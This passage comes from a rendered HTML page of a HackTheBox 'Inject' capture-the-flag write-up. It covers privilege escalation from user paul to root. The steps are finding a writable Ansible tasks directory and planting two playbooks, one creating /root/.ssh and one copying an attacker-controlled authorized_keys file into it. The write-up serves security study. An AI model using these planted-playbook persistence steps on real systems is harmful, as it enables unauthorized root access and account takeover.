+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;privateKey&gt;</span>${user.home}/.ssh/id_dsa<span class="nt">&lt;/privateKey&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;filePermissions&gt;</span>660<span class="nt">&lt;/filePermissions&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;directoryPermissions&gt;</span>660<span class="nt">&lt;/directoryPermissions&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;configuration&gt;&lt;/configuration&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/server&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/servers&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/settings&gt;</span>
+</span></span></code></pre></div><p>Using the password, we can change to user <code>paul</code></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_10.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Further looking into the writable folder and files, we can see that <code>/opt/automation/tasks</code> is writable by <code>staff</code> group member and <code>paul</code> is a member of that group.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">bash-5.0$</span> <span class="no">find</span> <span class="err">/</span> <span class="p">-</span><span class="no">writable</span> <span class="mi">2</span><span class="err">&gt;/</span><span class="no">dev</span><span class="err">/</span><span class="no">null</span> <span class="err">|</span> <span class="no">grep</span> <span class="p">-</span><span class="no">v</span> <span class="no">proc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">tmp</span><span class="err">/</span><span class="no">.XIM-unix</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">tmp</span><span class="err">/</span><span class="no">.font-unix</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">tmp</span><span class="err">/</span><span class="no">.X11-unix</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">tmp</span><span class="err">/</span><span class="no">.Test-unix</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">tmp</span><span class="err">/</span><span class="no">.ICE-unix</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">opt</span><span class="err">/</span><span class="no">automation</span><span class="err">/</span><span class="no">tasks</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">etc</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">nginx.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">etc</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">sysstat.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">var</span><span class="err">/</span><span class="no">tmp</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">var</span><span class="err">/</span><span class="no">crash</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">var</span><span class="err">/</span><span class="no">local</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">var</span><span class="err">/</span><span class="no">lock</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span><span class="err">/</span><span class="no">.bashrc</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span><span class="err">/</span><span class="no">.bash_history</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span><span class="err">/</span><span class="no">.cache</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span><span class="err">/</span><span class="no">.cache</span><span class="err">/</span><span class="no">motd.legal-displayed</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span><span class="err">/</span><span class="no">.profile</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span><span class="err">/</span><span class="no">.viminfo</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span><span class="err">/</span><span class="no">.vim</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">phil</span><span class="err">/</span><span class="no">.vim</span><span class="err">/</span><span class="no">.netrwhist</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">home</span><span class="err">/</span><span class="no">frank</span><span class="err">/</span><span class="no">.bash_history</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">screen-cleanup.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">lvm2.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">rcS.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">x11-common.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">cryptdisks.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">multipath-tools-boot.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">hwclock.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">rc.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">sudo.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">systemd</span><span class="err">/</span><span class="no">system</span><span class="err">/</span><span class="no">cryptdisks-early.service</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">local</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">python3.8</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">local</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">python3.8</span><span class="err">/</span><span class="no">dist-packages</span>
+</span></span><span class="line"><span class="cl"><span class="err">/</span><span class="nf">usr</span><span class="err">/</span><span class="no">local</span><span class="err">/</span><span class="no">share</span><span class="err">/</span><span class="no">fonts</span>
+</span></span></code></pre></div><p>That directory had an ansible playbook file for automating tasks</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_11.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>From the enumeration, we were able to anticipate that any tasks created in this directory will be executed, hence to replicate it, I created two tasks,</p>
+<p>This is for creating an <code>.ssh</code> directory is <code>root</code> home directory</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">- name: Create directory in root folder
+</span></span><span class="line"><span class="cl">  hosts: localhost
+</span></span><span class="line"><span class="cl">  become: yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  tasks:
+</span></span><span class="line"><span class="cl">    - name: Create directory
+</span></span><span class="line"><span class="cl">      file:
+</span></span><span class="line"><span class="cl">        path: /root/.ssh
+</span></span><span class="line"><span class="cl">        state: directory
+</span></span><span class="line"><span class="cl">        mode: &#39;0755&#39;
+</span></span><span class="line"><span class="cl">      register: create_result
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    - name: Display create result
+</span></span><span class="line"><span class="cl">      debug:
+</span></span><span class="line"><span class="cl">        var: create_result
+</span></span></code></pre></div><p>Another is to add the same public key we used for <code>frank</code> user to <code>root</code> user’s <code>authorized_keys</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">- name: Copy id_rsa file to /root/.ssh/
+</span></span><span class="line"><span class="cl">  hosts: localhost
+</span></span><span class="line"><span class="cl">  become: yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  tasks:
+</span></span><span class="line"><span class="cl">    - name: Copy id_rsa file
+</span></span><span class="line"><span class="cl">      copy:
+</span></span><span class="line"><span class="cl">        src: /home/frank/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">        dest: /root/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">        mode: &#39;0600&#39;
+</span></span><span class="line"><span class="cl">      register: copy_result
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    - name: Display copy result
+</span></span><span class="line"><span class="cl">      debug:
+</span></span><span class="line"><span class="cl">        var: copy_result
+</span></span></code></pre></div><p>Doing so, we were able to login to the  target as <code>root</code></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_12.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/escape-htb/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Escape</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-06-19 00:00:00 &#43;0000 UTC">19 June 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/busqueda-htb/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Busqueda</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-08-12 00:00:00 &#43;0000 UTC">12 August 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
